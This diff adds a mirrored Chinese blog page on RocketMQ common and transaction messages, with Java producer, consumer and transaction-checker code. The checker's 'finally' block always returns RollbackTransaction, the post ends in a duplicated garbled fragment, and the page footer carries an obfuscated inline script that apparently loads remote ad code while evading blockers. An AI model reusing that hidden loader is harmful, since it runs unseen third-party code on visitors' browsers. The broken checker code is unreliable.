+            producer<span class="token punctuation">.</span><span class="token function">sendCommonMessage</span><span class="token punctuation">(</span>TopicEnum<span class="token punctuation">.</span>TOPIC_TEAM<span class="token punctuation">,</span> TagEnum<span class="token punctuation">.</span>TAG_ISSUE<span class="token punctuation">,</span> JSONObject<span class="token punctuation">.</span><span class="token function">fromObject</span><span class="token punctuation">(</span>issue<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token comment">//TODO:发送Topic事务消息</span>
+
+            <span class="token keyword">return</span> ClientHttpResponseBody<span class="token punctuation">.</span><span class="token function">buildSuccess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">return</span> ClientHttpResponseBody<span class="token punctuation">.</span><span class="token function">buildError</span><span class="token punctuation">(</span>RtnCodeEnum<span class="token punctuation">.</span>SERVER_ERROR<span class="token punctuation">,</span> <span class="token string">"添加议题失败"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<h5><a id="_271"></a>设计消费者</h5> 
+<p>消费者组件放在autostart包下，说明这是自启动的组件，直观的表现出该程序的职责：启动消费者监听消息。</p> 
+<pre><code class="prism language-java"><span class="token annotation punctuation">@Configuration</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConsumerClient</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token annotation punctuation">@Autowired</span>
+    <span class="token keyword">private</span> MqConfig mqConfig<span class="token punctuation">;</span>
+
+    <span class="token annotation punctuation">@Autowired</span>
+    <span class="token keyword">private</span> IssueMessageListener messageListener<span class="token punctuation">;</span>
+
+    <span class="token annotation punctuation">@Bean</span><span class="token punctuation">(</span>initMethod <span class="token operator">=</span> <span class="token string">"start"</span><span class="token punctuation">,</span> destroyMethod <span class="token operator">=</span> <span class="token string">"shutdown"</span><span class="token punctuation">)</span>
+    <span class="token keyword">public</span> ConsumerBean <span class="token function">buildConsumer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        ConsumerBean consumerBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConsumerBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Properties properties <span class="token operator">=</span> mqConfig<span class="token punctuation">.</span><span class="token function">getMqPropertie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        properties<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>PropertyKeyConst<span class="token punctuation">.</span>GROUP_ID<span class="token punctuation">,</span> mqConfig<span class="token punctuation">.</span>GROUP_ISSUE_TEAM_NOTICE_ID<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        properties<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>PropertyKeyConst<span class="token punctuation">.</span>ConsumeThreadNums<span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        consumerBean<span class="token punctuation">.</span><span class="token function">setProperties</span><span class="token punctuation">(</span>properties<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">//订阅议题消息</span>
+        Map<span class="token generics function"><span class="token punctuation">&lt;</span>Subscription<span class="token punctuation">,</span> MessageListener<span class="token punctuation">&gt;</span></span> subscriptionTable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Subscription subscription <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Subscription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        subscription<span class="token punctuation">.</span><span class="token function">setTopic</span><span class="token punctuation">(</span>mqConfig<span class="token punctuation">.</span>TOPIC_ISSUE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        subscription<span class="token punctuation">.</span><span class="token function">setExpression</span><span class="token punctuation">(</span>mqConfig<span class="token punctuation">.</span>TAG_ISSUE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        subscriptionTable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>subscription<span class="token punctuation">,</span> messageListener<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        consumerBean<span class="token punctuation">.</span><span class="token function">setSubscriptionTable</span><span class="token punctuation">(</span>subscriptionTable<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> consumerBean<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>IssueMessageListener类完成消息的处理，注意，通过new String(message.getBody())获取消息内容，直接对byte[]调用toString只会获得数组对象类型。</p> 
+<p>消费者的消息处理流程，一般是先处理再提交（Commit），如果先提交再处理，则可能因为处理失败而错过本次消息。ReconsumeLater表示稍后重新接收消息。</p> 
+<pre><code class="prism language-java"><span class="token annotation punctuation">@Component</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IssueMessageListener</span> <span class="token keyword">implements</span> <span class="token class-name">MessageListener</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">private</span> NoticeService noticeService<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token function">IssueMessageListener</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Autowired</span> NoticeService noticeService<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>noticeService <span class="token operator">=</span> noticeService<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> Action <span class="token function">consume</span><span class="token punctuation">(</span>Message message<span class="token punctuation">,</span> ConsumeContext context<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
+            JSONObject object <span class="token operator">=</span> JSONObject<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            noticeService<span class="token punctuation">.</span><span class="token function">noticeTeam</span><span class="token punctuation">(</span>object<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"teamId"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> object<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"issue"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> Action<span class="token punctuation">.</span>CommitMessage<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+            <span class="token keyword">return</span> Action<span class="token punctuation">.</span>ReconsumeLater<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<h5><a id="_333"></a>发布与测试</h5> 
+<p>消费者与生产者是在不同模块或不同项目之中创建的，两者从属不同进程：</p> 
+<p><img src="https://images2.imgbox.com/4d/8b/zM0qFGxU_o.png" alt="image-20210114005159551"></p> 
+<p>测试：</p> 
+<p>从接口请求成功：</p> 
+<p><img src="https://images2.imgbox.com/e0/e6/5IHiBPsZ_o.png" alt="image-20210114004803112"></p> 
+<p>到消费者收到消息：</p> 
+<p><img src="https://images2.imgbox.com/52/ca/h8VNWKGe_o.png" alt="image-20210114005342452"></p> 
+<p>这就完成了一条消息的周转，通知搜索引擎上线也是相同的逻辑，只是用户组不同，就不再重复了，其他类型的消息，也只是在这个流程上稍作调整。</p> 
+<h5><a id="_355"></a>事务消息</h5> 
+<p>现如今，连转账这种业务做成只满足最终一致性就可以了，我们经常见到，支付成功但第三方订单还未收到的情况，一般等几秒钟就会完成同步，异常情况下需要几分钟，我们越来越可以接受这种情况，或者被塑造为可以接受这种情况，因为我们信任系统最终可以达成一致性。事务消息就是基于这种信任出现的一种消息发布方式，它保证了“本地事务”与“消息发布”这两者的同步性，也就是所谓的“要么同时成功，要么同时失败”，是一种非常可靠的消息发布方式。</p> 
+<p>为什么说事务消息是基于“信任”呢？它主要包含三个方面：</p> 
+<p>一是对生产者的信任。生产者需要按照约定先提交Half消息，然后执行本地事务，最后提交消息，如果执行失败，还需要放弃消息，最重要的是，还需要提供回查接口，每一步都不能错。rocketmq的回查有次数限制，如果回查接口异常，并且连续异常，那么就可能造成消息丢失。也就是说，如果生产者的代码逻辑或服务器有问题，事务消息同样会丢失消息！</p> 
+<p>二是对消息队列的信任。同最开始的讨论一样，broker的设计不能有问题，broker的服务器不能有问题，如果没有配置主从冗余实例，那么broker节点宕机，这部分的数据就耽搁了，如果broker节点爆炸，这部分的数据就没了。因此需要选择可靠的消息中间件，搭建可靠的集群架构。</p> 
+<p>三是对消费者的信任。消费者先接收消息，在执行本地任务，最后提交消息，这样的一般逻辑可以让消费者做到面对任何消息都能确保消息被确实消费，不会出现收到但没处理的情况（前提是不要异步执行本地任务，否则不能在提交前确认结果）。看似消费者很简单，其实它被RocketMQ的设计方针甩了个大麻烦，不论是普通消息还是事务消息，RocketMQ从未保证消息不会被重复消费，比如消费者消费成功但是提交失败，那么它下次还会再收到该消息。消费者需要独自实现幂等性，而且还是分布式幂等性。</p> 
+<p>Rocketmq消息队列只是提供一个数据传输的平台，事务消息只是规范了传输协议，而具体实现需要生产者和消费者的共同努力。（补充说明一下，生产者指生产者服务器与开发人员，消费者指消费者服务器与开发人员，消息中间件指中间件服务器与运维人员）</p> 
+<p>事务消息需要三方的信任，言外之意是其他消息不需要这种程度的信任，这部分的消息从业务上看，是可以允许丢失或能承担丢失的风险的。</p> 
+<p>基于“信任”的事务消息，与其他分布式事务处理机制完全不同，它不需要加锁或回滚（不是回滚消息，实际上，这也不算回滚，只是放弃Half消息而已）就能实现事务性。假如一个事务要完成A+B，常规做法是B失败了回滚A，如果回滚出现异常了就比较麻烦，还有分布式锁，会极大地限制并发数。事务消息的做法是完成A就宣布成功了，不把B当作自己需要做的事务之一，它相信B会执行成功，或者就算失败也会不断爬起来重试，最终会达成目的，不需要回头。最优雅的解决方案就是不解决。</p> 
+<p>事务消息Bean配置：</p> 
+<pre><code class="prism language-java"><span class="token annotation punctuation">@Configuration</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TransactionProducerConfig</span> <span class="token punctuation">{<!-- --></span>
+
+    <span class="token annotation punctuation">@Autowired</span>
+    <span class="token keyword">private</span> MqConfig mqConfig<span class="token punctuation">;</span>
+
+    <span class="token annotation punctuation">@Autowired</span>
+    <span class="token keyword">private</span> IssueTransactionChecker issueTransactionChecker<span class="token punctuation">;</span>
+
+    <span class="token annotation punctuation">@Bean</span><span class="token punctuation">(</span>initMethod <span class="token operator">=</span> <span class="token string">"start"</span><span class="token punctuation">,</span> destroyMethod <span class="token operator">=</span> <span class="token string">"shutdown"</span><span class="token punctuation">)</span>
+    <span class="token keyword">public</span> TransactionProducerBean <span class="token function">buildTransactionProducer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        TransactionProducerBean producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransactionProducerBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        producer<span class="token punctuation">.</span><span class="token function">setProperties</span><span class="token punctuation">(</span>mqConfig<span class="token punctuation">.</span><span class="token function">getMqPropertie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        producer<span class="token punctuation">.</span><span class="token function">setLocalTransactionChecker</span><span class="token punctuation">(</span>issueTransactionChecker<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> producer<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>回查接口实现：（先提交Half消息就是为了帮助broker知道哪些需要回查）</p> 
+<pre><code class="prism language-java"><span class="token annotation punctuation">@Component</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IssueTransactionChecker</span> <span class="token keyword">implements</span> <span class="token class-name">LocalTransactionChecker</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">private</span> IssueRepository issueRepository<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token function">IssueTransactionChecker</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Autowired</span> IssueRepository issueRepository<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>issueRepository <span class="token operator">=</span> issueRepository<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> TransactionStatus <span class="token function">check</span><span class="token punctuation">(</span>Message msg<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token comment">//检查议题是否入库</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
+            JSONObject issue <span class="token operator">=</span> JSONObject<span class="token punctuation">.</span><span class="token function">fromObject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> issueRepository<span class="token punctuation">.</span><span class="token function">checkIssueExist</span><span class="token punctuation">(</span>issue<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"issue"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> TransactionStatus<span class="token punctuation">.</span>CommitTransaction <span class="token operator">:</span> TransactionStatus<span class="token punctuation">.</span>RollbackTransaction<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token keyword">finally</span> <span class="token punctuation">{<!-- --></span>
+            <span class="token keyword">return</span> TransactionStatus<span class="token punctuation">.</span>RollbackTransaction<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>完善后的创建议题接口：同时发布了两个Topic消息，一个是普通消息，一个是事务消息。</p> 
+<p>send方法用来发送一条事务型消息. 一条事务型消息发送分为三个步骤:</p> 
+<ul><li>服务实现类首先发送一条半消息到消息服务器;</li><li>通过executer执行本地事务;在当前线程内完成。</li><li>根据上一步骤执行结果, 决定发送提交或者回滚第一步发送的半消息;</li></ul> 
+<pre><code class="prism language-java"><span class="token annotation punctuation">@RestController</span>
+<span class="token annotation punctuation">@Validated</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IssueController</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">private</span> <span class="token keyword">final</span> IssueRepository issueRepository<span class="token punctuation">;</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">final</span> ProducerClient producer<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token function">IssueController</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Autowired</span> IssueRepository issueRepository<span class="token punctuation">,</span> <span class="token annotation punctuation">@Autowired</span> ProducerClient producer<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>issueRepository <span class="token operator">=</span> issueRepository<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>producer <span class="token operator">=</span> producer<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/issue"</span><span class="token punctuation">)</span>
+    <span class="token keyword">public</span> String <span class="token function">makeIssue</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token annotation punctuation">@Validated</span> Issue issue<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token comment">//发送Topic事务消息</span>
+        <span class="token keyword">boolean</span> isSuccess <span class="token operator">=</span> producer<span class="token punctuation">.</span><span class="token function">sendTransactionIssueMessage</span><span class="token punctuation">(</span>JSONObject<span class="token punctuation">.</span><span class="token function">fromObject</span><span class="token punctuation">(</span>issue<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>msg<span class="token punctuation">,</span> arg<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token punctuation">{<!-- --></span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>issueRepository<span class="token punctuation">.</span><span class="token function">addIssue</span><span class="token punctuation">(</span>issue<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
+                <span class="token keyword">return</span> TransactionStatus<span class="token punctuation">.</span>CommitTransaction<span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">return</span> TransactionStatus<span class="token punctuation">.</span>RollbackTransaction<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>isSuccess<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
+            <span class="token comment">//发送Topic普通消息</span>
+            producer<span class="token punctuation">.</span><span class="token function">sendCommonMessage</span><span class="token punctuation">(</span>TopicEnum<span class="token punctuation">.</span>TOPIC_TEAM<span class="token punctuation">,</span> TagEnum<span class="token punctuation">.</span>TAG_ISSUE<span class="token punctuation">,</span> JSONObject<span class="token punctuation">.</span><span class="token function">fromObject</span><span class="token punctuation">(</span>issue<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> ClientHttpResponseBody<span class="token punctuation">.</span><span class="token function">buildSuccess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">return</span> ClientHttpResponseBody<span class="token punctuation">.</span><span class="token function">buildError</span><span class="token punctuation">(</span>RtnCodeEnum<span class="token punctuation">.</span>SERVER_ERROR<span class="token punctuation">,</span> <span class="token string">"添加议题失败"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>消费者的消息监听器：（发布于不同的进程）</p> 
+<pre><code class="prism language-java"><span class="token annotation punctuation">@Component</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IssueMessageListener</span> <span class="token keyword">implements</span> <span class="token class-name">MessageListener</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">private</span> <span class="token keyword">final</span> PointService pointService<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token function">IssueMessageListener</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Autowired</span> PointService pointService<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>pointService <span class="token operator">=</span> pointService<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> Action <span class="token function">consume</span><span class="token punctuation">(</span>Message message<span class="token punctuation">,</span> ConsumeContext context<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
+            JSONObject object <span class="token operator">=</span> JSONObject<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            pointService<span class="token punctuation">.</span><span class="token function">addPointForIssue</span><span class="token punctuation">(</span>object<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"posterId"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> Action<span class="token punctuation">.</span>CommitMessage<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+            <span class="token keyword">return</span> Action<span class="token punctuation">.</span>ReconsumeLater<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>测试：</p> 
+<p><img src="https://images2.imgbox.com/c4/62/k8jsCUgj_o.png" alt="image-20210115005359217"></p> 
+<p>接收：</p> 
+<p><img src="https://images2.imgbox.com/9f/c7/6O6TrwdY_o.png" alt="image-20210115005548427"></p> 
+<p>全部完成目标O(∩_∩)O。</p> 
+<p>ion consume(Message message, ConsumeContext context) {<!-- --><br> try {<!-- --><br> JSONObject object = JSONObject.parseObject(new String(message.getBody()));<br> pointService.addPointForIssue(object.getString(“posterId”));<br> return Action.CommitMessage;<br> } catch (Exception e) {<!-- --><br> return Action.ReconsumeLater;<br> }<br> }<br> }</p> 
+<pre><code>
+测试：
+
+[外链图片转存中...(img-VXmwUKw6-1615102534033)]
+
+接收：
+
+[外链图片转存中...(img-m9ogBvrY-1615102534037)]
+
+全部完成目标O(∩_∩)O。
+
+</code></pre>
+                </div>
+		</div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/26c8301808053960f72dd987f283ca50/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">垂直居中的几种方法总结</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/c527594e42da37266b828bb12e3382aa/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">Spring Boot集成mysql与Redis</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程随想.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+
+<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x